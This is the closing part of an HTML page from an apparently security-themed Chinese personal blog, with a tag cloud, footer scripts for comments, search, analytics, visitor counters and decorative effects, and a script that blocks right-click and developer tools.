rel="tag">漏洞工具</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" rel="tag">爆破工具</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%89%88%E6%9C%AC%E5%85%B1%E5%AD%98/" rel="tag">版本共存</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87/" rel="tag">监控设备</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86%E6%8B%93%E5%B1%95/" rel="tag">知识拓展</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/" rel="tag">知识积累</a><span class="tag-list-count">28</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" rel="tag">端口转发</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%B7%A5%E5%85%B7/" rel="tag">网络攻防工具</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%8B%B1%E8%AF%AD%E5%9B%9B%E7%BA%A7/" rel="tag">英语四级</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%AE%E8%AE%BA%E6%96%87%E4%B8%87%E8%83%BD%E6%A8%A1%E6%9D%BF/" rel="tag">议论文万能模板</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" rel="tag">设计模式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/" rel="tag">谷歌语法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B6%8A%E6%9D%83/" rel="tag">越权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%9C%E6%8E%A7%E5%B7%A5%E5%85%B7/" rel="tag">远控工具</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/" rel="tag">选择排序</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%93%BE%E8%A1%A8%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/" rel="tag">链表实现队列</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">链表的增删改查</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" rel="tag">靶场实战</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/" rel="tag">验证码绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/" rel="tag">黑客工具</a><span class="tag-list-count">64</span></li></ul>
          </canvas>
      </div>
      </div>
      
      -->
      <!-- 标签云 -->

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; 2020 &mdash; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
       <i class="fa fa-heartbeat"></i>
  </span>
  <!--
    <span class="author" itemprop="copyrightHolder"> &nbsp;孤桜懶契</span>
  -->
  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
    <span title="Site words total count">275.6k</span>
  
</div>












  <div class="subscribe-box">

  </div>


        
<div class="busuanzi-count">
  <!--
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  -->
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

   

  
  
    
      <span class="site-uv">
        
        我的第 <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 位朋友，
      </span>
    

    
      <span class="site-pv">
        历经 <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次回眸才与你相遇
        <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      </span>
    
  

</div>








        
      </div>
    </footer>

    
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  










  



  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script id="ribbon" type="text/javascript" size="60" alpha="0.1"  zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="/js/src/av-min.js"></script>
  <script src="/js/src/Valine.min.js"></script>

  <!-- https://deserts.io/diy-a-comment-system/ -->
  <script type="text/javascript">
    new Valine({
        lang: 'zh-cn',
        admin_email: '2324298849@qq.com', //博主邮箱
        el: '#comments' ,
        appId: 'HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz',
        appKey: 'wp1HNJ17SdpnE0wIFq99eTKH',
        emoticon_url: 'https://cdn.jsdelivr.net/gh/leafjame/cdn/emoji',
       // emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
        emoticon_list: ["大佬.gif","点赞.gif","尴尬.gif","鼓掌.gif","笑哭.gif","害羞.gif","黑人问号.gif","坏笑.gif","惊吓.gif","可爱.gif","抠鼻子.gif","流汗.gif","色.gif","吐血.gif","无奈.gif","huaji.png","liuhanhuaji.png","mojinghuaji.png","coshuaji.png","shounuehuaji.png","jizhi.png","doge.png","chigua.png","motion_1016.png","motion_1012.png","motion_1017.png","f_hufen.png","f_geili.png","f_jiong.png","f_meng.png","f_shenma.png","f_v5.png","c_onef.png","c_onem.png","c_fivem.png","c_oney.png","c_teny.png","c_oy.png","1f60a.png","1f60b.png","1f60d.png","1f60e.png","1f61a.png","1f62d.png","1f601.png","1f602.png","1f605.png","1f606.png","1f607.png","1f618.png","1f630.png","1f631.png","1f632.png","1f633.png","1f63e.png","1f63f.png","1f638.png","1f639.png","zhayanjian.gif","ciya.gif","xieyanxiao.gif","huaixiao.gif","xiaoku.gif","leiben.gif","penxue.gif","hanxiao.gif","baiyan.gif","cahan.gif","fadai.gif","haixiu.gif","haqian.gif","ku.gif","liuhan.gif","OK.gif","qiang.gif","woshou.gif","baoquan.gif","qiudale.gif","se.gif","yinxian.gif","yun.gif","zaijian.gif"],
        placeholder: '&#x270d;&nbsp;写评论',
  });

  <!--点击邮件中的链接跳转至相应评论-->
  if(window.location.hash){
      var checkExist = setInterval(function() {
         if ($(window.location.hash).length) {
            $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
            clearInterval(checkExist);
         }
      }, 100);
   }

  </script>






  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





    <script>  function addCount(Counter){var $visitors=$('.leancloud_visitors');var url=$visitors.attr('id').trim();var title=$visitors.attr('data-flag-title').trim();Counter('get','/classes/Counter',{where:JSON.stringify({url})}).done(function({results}){if(results.length>0){var counter=results[0]; var $element=$(document.getElementById(url));$element.find('.leancloud-visitors-count').text(counter.time+1);Counter('put','/classes/Counter/'+counter.objectId,JSON.stringify({time:{'__op':'Increment','amount':1}})) .fail(function({responseJSON}){console.log('Failed to save Visitor num, with error message: '+responseJSON.error);})}else{ Counter('post','/classes/Counter',JSON.stringify({title:title,url:url,time:1})).done(function(){var $element=$(document.getElementById(url));$element.find('.leancloud-visitors-count').text(1);}).fail(function(){console.log('Failed to create');});}}).fail(function({responseJSON}){console.log('LeanCloud Counter Error: '+responseJSON.code+' '+responseJSON.error);});}$(function(){$.get('https://app-router.leancloud.cn/2/route?appId='+'HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz').done(function({api_server}){var Counter=function(method,url,data){return $.ajax({method:method,url:'https://'+api_server+'/1.1'+url,headers:{'X-LC-Id':'HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz','X-LC-Key':'wp1HNJ17SdpnE0wIFq99eTKH','Content-Type':'application/json',},data:data});};  const localhost=/http:\/\/(localhost|127.0.0.1|0.0.0.0)/;if(localhost.test(document.URL))return;addCount(Counter);});});</script>

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  
  <script type="text/javascript">
  wpac_init = window.wpac_init || [];
  wpac_init.push({widget: 'Rating', id: 31766,
    el: 'wpac-rating',
    color: 'ff9800'
  });
  (function() {
    if ('WIDGETPACK_LOADED' in window) return;
    WIDGETPACK_LOADED = true;
    var mc = document.createElement('script');
    mc.type = 'text/javascript';
    mc.async = true;
    mc.src = '/js/src/widget.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
  })();
  </script>


  

  

  


  <!-- Tidio 在线联系功能、鼠标点击特效、页面反馈...-->
  


  
    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas>
    <script async src="/js/src/anime.min.js"></script>
    <script async src="/js/cursor/explosion.min.js"></script>
  



<script>//禁止右键
function click(e) {
if (document.all) {
if (event.button==2||event.button==3) { alert("欢迎光临寒舍，有什么需要帮忙的话，请与站长联系！谢谢您的合作！！！");
oncontextmenu='return false';
}
}
if (document.layers) {
if (e.which == 3) {
oncontextmenu='return false';
}
}
}
if (document.layers) {
document.captureEvents(Event.MOUSEDOWN);
}
document.onmousedown=click;
document.oncontextmenu = new Function("return false;")
document.onkeydown =document.onkeyup = document.onkeypress=function(){
if(window.event.keyCode == 12) {
window.event.returnValue=false;
return(false);
}
}
</script>


  <script>//禁止F12
function fuckyou(){
//关闭当前窗口(防抽)
window.location="https://github.com/GYLQ"; //将当前窗口跳转置空白页
}

function click(e) {
if (document.all) {
  if (event.button==2||event.button==3) {
alert("欢迎光临寒舍，有什么需要帮忙的话，请与站长联系！谢谢您的合作！！！");
oncontextmenu='return false';
}

}
if (document.layers) {
if (e.which == 3) {
oncontextmenu='return false';
}
}
}
if (document.layers) {
fuckyou();
document.captureEvents(Event.MOUSEDOWN);
}
document.onmousedown=click;
document.oncontextmenu = new Function("return false;")
document.onkeydown =document.onkeyup = document.onkeypress=function(){
if(window.event.keyCode == 123) {
fuckyou();
window.event.returnValue=false;
return(false);
}
}
</script>







 <!-- Hotjar Tracking Code for https://gylq.gitee.io -->
  <script async>
      (function(h,o,t,j,a,r){
          h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
          h._hjSettings={hjid:2656906,hjsv:6};
          a=o.getElementsByTagName('head')[0];
          r=o.createElement('script');r.async=1;
          r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
          a.appendChild(r);
      })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
  </script>




  <script src="/js/src/activate-power-mode.min.js"></script>
  <script>
    POWERMODE.colorful = true;
    POWERMODE.shake = false;
    document.body.addEventListener('input', POWERMODE);
  </script>






  <script async language="javascript">

    var div = document.createElement("div");
    //插入到自定义的theme-info或者copyright之后
    var copyright = document.querySelector(".theme-info2") || document.querySelector(".copyright");

    function show_run_time(){
        window.setTimeout("show_run_time()", 1000);
      // BirthDay=new Date("03/07/2020 20:00:00");
        BirthDay=new Date("07/02/2020 10:00:00");
        today=new Date();
        timeold=(today.getTime()-BirthDay.getTime());
        sectimeold=timeold/1000
        secondsold=Math.floor(sectimeold);
        msPerDay=24*60*60*1000
        e_daysold=timeold/msPerDay
        daysold=Math.floor(e_daysold);
        e_hrsold=(e_daysold-daysold)*24;
        hrsold=setzero(Math.floor(e_hrsold));
        e_minsold=(e_hrsold-hrsold)*60;
        minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
        seconds=setzero(Math.floor((e_minsold-minsold)*60));

        // 使用zh-Hans.yml的文字替换
        div.innerHTML = "我已在此等候你 " + "<span style='color: #1890ff'> " + daysold + " </span> 天 <span style='color: #1890ff'>" + hrsold + " </span>时 <span style='color: #1890ff'>" + minsold + " </span>分 <span style='color: #1890ff'>" + seconds + " </span>秒 ";

        document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);

    }
    function setzero(i){
        if (i<10)
        {i="0" + i};
        return i;
    }

    show_run_time();

  </script>




<!-- 旋转魔方 -->

   
      
<style>
    .cube_container {
      width: 50px;
      height: 60px;
      margin: 0 auto;
      position: fixed;
      z-index: 999;
      -webkit-perspective: 1000px;
              perspective: 1000px;
      right: 0px;
      bottom: 0px;
      -webkit-transform: translate(-50%, -50%);
              transform: translate(-50%, -50%);
    }

    .cube {
      /*
      width: 100%;
      height: 100%;
      */
      width: 0%; /* 大角度旋转 */
      position: absolute;
      -webkit-transform-style: preserve-3d;
      transform-style: preserve-3d;
      -webkit-transform: rotateX(-15deg) rotateY(-20deg) translateZ(-100px);
      transform: rotateX(-15deg) rotateY(-20deg) translateZ(-100px);
      -webkit-transform-origin: center center -100px;
      transform-origin: center center -100px;
      -webkit-animation: around 5s cubic-bezier(0.94, -0.6, 0.45, 1.31) infinite;
      animation: around 5s cubic-bezier(0.94, -0.6, 0.45, 1.31) infinite;
    }
    .cube div {
      width: 50px;
      height: 50px;
      display: block;
      margin: 0;
      position: absolute;
    }
    .cube div a {
      color: white;
      font-size: 12px;
      text-decoration: none;
      text-align: center;
      position: fixed;
      top: 50%;
      left: 45%;
      -webkit-transform: translate(-50%, -50%);
              transform: translate(-50%, -50%);
    }
    .cube .front {
      -webkit-transform: rotateY(0deg) translateZ(25px);
              transform: rotateY(0deg) translateZ(25px);
      background-color: rgba(0, 191, 255, 0.7);
      border: 1px solid rgba(0, 191, 255, 0.7);
    }
    .cube .back {
      -webkit-transform: rotateX(180deg) translateZ(25px);
              transform: rotateX(180deg) translateZ(25px);
      background-color: rgba(124, 252, 0, 0.7);
      border: 1px solid rgba(124, 252, 0, 0.7);
    }
    .cube .left {
      -webkit-transform: rotateY(-90deg) translateZ(25px);
              transform: rotateY(-90deg) translateZ(25px);
      background-color: rgba(255, 215, 0, 0.7);
      border: 1px solid rgba(255, 215, 0, 0.7);
    }
    .cube .right {
      -webkit-transform: rotateY(90deg) translateZ(25px);
              transform: rotateY(90deg) translateZ(25px);
      background-color: rgba(255, 69, 0, 0.7);
      border: 1px solid rgba(255, 69, 0, 0.7);
    }
    .cube .top {
      -webkit-transform: rotateX(90deg) translateZ(25px);
              transform: rotateX(90deg) translateZ(25px);
      background-color: rgba(255, 0, 157, 0.7);
      border: 1px solid rgba(255, 0, 157, 0.7);
    }
    .cube .bottom {
      -webkit-transform: rotateX(-90deg) translateZ(25px);
              transform: rotateX(-90deg) translateZ(25px);
      background-color: rgba(184, 111, 220, 0.7);
      border: 1px solid rgba(184, 111, 220, 0.7);
    }

     @-webkit-keyframes around {
      100% {
        -webkit-transform: rotateX(-15deg) rotateY(-380deg) translateZ(-100px);
                transform: rotateX(-15deg) rotateY(-380deg) translateZ(-100px);
      }
    }

    @keyframes around {
      100% {
        -webkit-transform: rotateX(-15deg) rotateY(-380deg) translateZ(-100px);
        transform: rotateX(-15deg) rotateY(-380deg) translateZ(-100px);
      }
    }
</style>

<div class="cube_container">
	  <div class="cube">
	    <div class="front"><a onclick="back2top()" rel="nofollow"> 欢迎光临 </a></div>
	    <div class="back"><a onclick="back2top()" rel="nofollow"> ❤️ </a></div>
	    <div class="right"><a onclick="back2top()" rel="nofollow"> 孤桜懶契 </a></div>
	    <div class="left"><a onclick="back2top()" role="button" rel="nofollow"> 请多关照 </a></div>
	    <div class="top"><a href="https://gylq.gitee.io/gylq-navigation/" target="_blank" rel="nofollow"> ❤️ </a></div>
	    <div class="bottom"><a href="https://gylq.gitee.io/gylq-navigation/" target="_blank" rel="nofollow"> ❤️ </a></div>
	  </div>
</div>

<script>

  function back2top(){
    $('html, body').animate({scrollTop: 0}, 500);
  }

</script>

   


<!-- Console 输出第三方个性化字体 -->

  <script async type="text/javascript" src="/figlet/fetch.min.js"></script>
  <script type="text/javascript" src="/figlet/figlet.js"></script>
  <script type="text/javascript">

      figlet.defaults({fontPath: "/figlet/fonts"});
      figlet("Welcome To 孤桜懶契", "Big Money-ne", function(err, text) {
          if (err) {
              console.log("something went wrong...");
              console.dir(err);
              return;
          }
          console.log(text);
      });
  </script>


  <!-- Console 输出自定义字体 -->
  
    <script async type="text/javascript">
        var text = "Welcome To Leaface";
        var date = '2022-11-05';
        console.log("%c " + text, "font-size:100px;color:white;border-radius:20px;height:200px; background:-webkit-linear-gradient(yellow,orange,red,green,blue,purple);text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);");
        console.info('\n' + ' %c Leafae Site %c https://www.liaofuzhan.com ' + '\n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;');
        console.info('\n' + ' %c Leafae QQ %c 793458585 ' + '\n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;');
        console.info('\n' + ' %c Leafae Wechat %c leaface ' + '\n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;');
       // console.log("%c Time: " + date, "font-size:100px;white:"+fcolor+";border-radius:20px;height:200px; background:-webkit-linear-gradient(yellow,orange,red,green,blue,purple);text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);  background-image: linear-gradient(to right, orangered, orange, gold, lightgreen, cyan, dodgerblue, mediumpurple, hotpink, orangered);");
       // console.log("%c .", "padding:300px 600px;line-height:10px;background:url(https://s2.ax1x.com/2019/10/17/KkoAJJ.md.png) no-repeat;");
    </script>
  


  <!-- 看板娘 -->
  
      <script async src="/live2d-widget/autoload.js"></script>
  

  
  

  <!-- 代码块复制功能 -->
  <script async type="text/javascript" src="/js/src/clipboard.min.js"></script>
  <script async type="text/javascript" src="/js/src/clipboard-use.js"></script>

  <!--share.js-->
  <link async rel="stylesheet" href="/sharejs/css/share.min.css">
  <script async src="/sharejs/js/social-share.min.js"></script>

  <!-- 模仿知乎卡片样式链接、崩溃欺骗特效 -->
  <script async type="text/javascript" src="/js/src/linkcard.js"></script>

  <!--崩溃欺骗 放在js文件最后-->
  <!--
  <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
  -->

 
    <script src="https://myhkw.cn/api/player/159368326389" id="myhk" key="159368326389" m="1"></script>
 


</body>
</html>
